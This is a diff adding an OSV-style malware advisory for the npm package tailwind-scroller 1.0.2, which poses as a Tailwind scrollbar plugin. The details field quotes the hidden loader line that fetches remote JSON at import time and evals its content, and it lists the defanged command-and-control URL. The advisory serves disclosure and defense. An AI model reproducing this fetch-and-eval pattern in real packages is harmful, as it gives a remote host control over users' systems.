@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5255",
+  "modified": "2026-06-14T16:04:12Z",
+  "published": "2026-06-14T16:02:58Z",
+  "summary": "Malicious code in tailwind-scroller (npm)",
+  "details": "Package tailwind-scroller@1.0.2 masquerades as a Tailwind CSS scrollbar plugin but contains a remote code execution downloader. The file src/helpers.js includes a base64-encoded URL (hxxps://www[.]jsonkeeper[.]com/b/Y12K7) that is fetched at require time via fetch().then(r=\u003er.json()).then(d=\u003e{eval(d.content);}). The fetched JSON's \"content\" field is evaluated as arbitrary JavaScript, giving the remote host full control over the runtime environment. The package has no lifecycle hooks — execution occurs when the package is imported by Node.js code. The C2 host is www[.]jsonkeeper[.]com, path /b/Y12K7. The remaining files (src/index.js, src/utilities.js, src/variants.js) contain legitimate Tailwind scrollbar styling code that serves as a facade.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "tailwind-scroller",
+        "purl": "pkg:npm/tailwind-scroller@1.0.2"
+      },
+      "versions": [
+        "1.0.2"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/tailwind-scroller/v/1.0.2"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5255"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-14T16:02:58Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "www[.]jsonkeeper[.]com"
+        ],
+        "url_observed": [
+          "hxxps://www[.]jsonkeeper[.]com/b/Y12K7"
+        ]
+      }
+    }
+  }
+}
